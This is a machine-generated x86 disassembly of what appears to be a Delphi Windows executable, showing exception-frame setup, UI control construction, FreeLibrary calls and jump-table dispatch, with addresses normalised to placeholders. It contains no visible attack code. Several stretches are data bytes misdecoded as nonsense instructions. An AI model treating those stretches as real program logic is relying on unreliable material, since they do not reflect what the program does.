push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2c3
retn
call sub_42e1f8
sub_42e39c
out dx al
[ ebx + ebp * 8 + 0x42 ]
add [ ecx + ebp * 8 + 0x42 ] dh
add [ eax - 0x15 ] dh
inc edx
add [ edx ] dl
push esp
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
in eax 0x42
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x408d676f
add ah al
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
in eax 0x42
add [ eax ] dh
in eax 0x42
add [ eax ] ch
add al [ eax ]
add [ esi + ecx * 4 + 0x42 ] al
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + edx * 2 ] cl
add [ esi ] al
inc esi
add [ edi ] al
adc dl [ edi + ecx * 2 + 0x70 ]
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0xe33c676f
inc edx
add [ eax + 0x74 ] cl
inc edx
add [ ebx ] dl
add [ edi ] al
inc ebp
js r-xdata
inc esp
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
inc esp
insb
jae r-xdata
xchg esp eax
adc [ eax ] al
pushad
add [ eax ] al
jmp [ eax ]
imul ebp [ esp + esi * 2 + 0x65 ] r-xdata
pop esp
in al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1b ] cl
inc edx
add [ eax + edx + 0x600040 ] dl
add bh bh
pushad
add [ eax ] al
inc [ edi + ebp * 8 + 0x42 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46060008 ] al
sub_42e5f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_42e8ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_427a60
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_423c58
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x60 ]
call sub_403ffc
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a7fc
mov ebx eax
mov [ esi + 0xb8 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43cf50
push 0xa9
push 0xc8
mov ecx 0x5
mov edx 0xcc
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
call sub_42ac4c
mov edx 0x6
mov eax ebx
call sub_42ac84
mov dx 0x1
mov eax ebx
call sub_443924
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_433764
mov ebx eax
mov [ esi + 0xbc ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43cf50
push 0x9d
push 0x17
mov ecx 0x6
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x1
mov eax ebx
call sub_43c434
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d4a4
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_42dc78
mov ecx r-xdata
mov edx [ rw-data ]
call sub_422894
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405b88
xor edx edx
mov eax ebx
call sub_43d094
mov dl 0x1
mov eax ebx
call sub_43d070
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a7fc
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43cf50
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_43c434
mov dl 0x2
mov eax ebx
call sub_42ac30
mov dl 0x1
mov eax ebx
call sub_42ac4c
xor edx edx
mov eax ebx
call sub_443924
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a054
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_43c434
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_42a480
mov dl 0x1
mov eax ebx
call sub_42a450
mov dl 0x1
mov eax ebx
call sub_42a428
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8b4
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
add esp 0xfffffff0
call sub_40357c
sub_42e8b4
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42eab5
xor ebx ebx
call sub_403a60
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_427c60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eb53
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403fcc
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fcc
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_43cf50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_42a440
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_43cf50
sub_42eb70
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ec48
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_43c8e0
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_43c8c0
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_43c690
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_42a440
lea eax [ ebx + 0xcc ]
call sub_403fa8
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_43cf50
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_440e3c
mov eax ebx
call sub_4279c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec4f
lea eax [ ebp - 0x34 ]
call sub_403fa8
retn
sub_42ec88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_42eeef
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455308
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42eed2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45614c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b88
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cf50
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_456acc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_45712c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a7fc
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43cf50
mov dl 0x5
mov eax ebx
call sub_43c434
xor edx edx
mov eax ebx
call sub_42ac4c
mov dl 0x1
mov eax ebx
call sub_42aca0
mov edx 0x5
mov eax ebx
call sub_42ac84
mov edx 0xff000005
mov eax ebx
call sub_43d0c0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a054
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_43c434
mov dl 0x1
mov eax esi
call sub_42a450
mov dl 0x1
mov eax esi
call sub_42a480
mov dl 0x1
mov eax esi
call sub_42a428
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_420378
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42eed9
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov eax [ ebp - 0x4 ]
call sub_43c924
mov esi eax
mov eax ebx
call sub_43c924
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_420378
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_456c9c
call sub_45a418
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_4242a0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4560ec
mov eax [ ebp - 0x4 ]
call sub_43c968
mov esi eax
mov eax ebx
call sub_43c968
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_420390
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_456c9c
call sub_45a3e4
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_4242a0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45611c
add eax 0x3
sub_42ef44
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ef8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_423c58
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_4043b4
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef96
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_42ef9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42efc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42efc8
retn
sub_42efe3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f028
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f02f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a30
sub_42f04b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42f090
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f097
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a30
sub_42f0a7
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f0fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f104
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403fa8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f110
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f154
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f15b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f168
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f18d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f194
retn
sub_42f1a0
in al dx
int1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
int1
inc edx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0xe ] bh
inc edx
add [ edx + esi * 8 + 0x540b0042 ] cl
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42f30f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f316
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049e4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049e4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f2a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f30f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f316
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049e4
mov eax rw-data
mov edx [ r-xdata ]
call sub_4049e4
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42f568
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_426554
mov [ esi + 0x5 ] al
call sub_42f240
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42fee0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42f5b4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_42f654
call sub_426394
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42f5e8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42f654
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42f698
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f6e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f734
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f778
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42f7c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42f828
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4047f4
push eax
mov eax esi
call sub_4047e4
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42f5e8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42f88c
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f910
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f94c
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42f9e8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42fa05 ]
jmp [ eax * 4 + jump_table_42fa6e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
